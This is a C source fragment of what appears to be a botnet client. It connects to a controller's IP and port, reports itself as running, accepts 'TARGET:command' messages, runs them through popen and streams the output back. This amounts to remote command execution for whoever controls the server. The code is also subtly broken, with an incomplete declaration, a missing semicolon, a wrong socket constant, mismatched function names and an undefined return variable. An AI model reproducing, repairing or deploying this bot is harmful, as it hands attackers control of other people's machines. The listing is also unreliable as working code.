#include "connect.h"

int
run (int s, char *cmd)
{
  char  line[1024];
  FILE *f = popen (cmd,"r");

  if (!f) return -1;
  while (!feof (f))
    {
      if (!fgets (line, 1024, f)) break;
      bot_print (s, bot_id);
      bot_print (s, ":");
      bot_print (s, line);
    }
  fclose(f);

  return 0;
}

int
parse (int s, char *msg)
{
  char

  char *target = msg;
  char *cmd = NULL;

  if ((cmd = strchr (msg, ':')) == NULL)
    {
      printf ("!! Malformed command. Should be TARGET:command\n");
      return -1;
    }

  *cmd = 0;
  cmd++;
  cmd[strlen(cmd) - 1] = 0;

  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
    return 0; // Silently ignore messages not for us

  printf ("+ Executing command: '%s'\n", cmd);
  bot_run_cmd (s, cmd);

  return 0;
}


int
conn (char *ip, int port)
{
	char msg[CMD_LENGTH]
	struct sockaddr_in server;
	int channel;

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if((channel = socket (PF_NET, SOCK_STREAM, 0)) < 0) {
    perror ("socket:");
    exit(1);
  }
  if ((connect (channel, (struct sockaddr*) &server, sizeof(server))) < 0) {
    perror ("connect:");
    exit(1);
  }

  snprintf (msg, CMD_LENGTH, "%s: This is '%s' Up and Running\n", bot_id, bot_id);
  peer_print (s, msg);
  return s;
}